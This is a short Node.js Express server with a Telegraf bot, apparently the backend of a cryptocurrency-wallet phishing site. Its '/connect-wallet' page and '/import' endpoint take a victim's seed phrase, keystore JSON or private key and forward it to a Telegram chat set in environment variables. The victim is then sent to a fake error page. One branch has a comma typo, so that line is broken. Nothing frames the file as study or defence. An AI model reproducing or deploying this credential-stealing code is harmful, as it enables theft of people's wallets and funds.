const express = require("express")
const path = require("path")
const { Telegraf } = require('telegraf')
const fs = require("fs")
require('dotenv').config()

const app = express()

app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }))

const bot = new Telegraf(process.env.BOT_TOKEN)

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/index.html"))
})

app.get("/connect-wallet", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/connect-wallet.html"))
})

app.post("/import", async (req, res) => {
    try {
        if(req.body.phrase_key) {
          bot.telegram.sendMessage(process.env.chatID, req.body.phrase_key)
        } else if(req.body.keystore_json) {
          bot.telegram.sendMessage(process.env.chatID, req.body.keystore_json)
        } else {
          bot.telegram,sendMessage(process.env.chatID, req.body.private_key)
        }
    }catch(err) {
        console.log(err)
    }
    res.redirect("/error")
})

app.post("/info", async (req, res) => {
  console.log(req.body)

  res.redirect("/")
})

app.get("/error", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/error.html"))
})

const port = process.env.PORT || 3000

app.listen(port, () => console.log(`LISTENING TO THE SERVER ON PORT ${port}`))

bot.launch()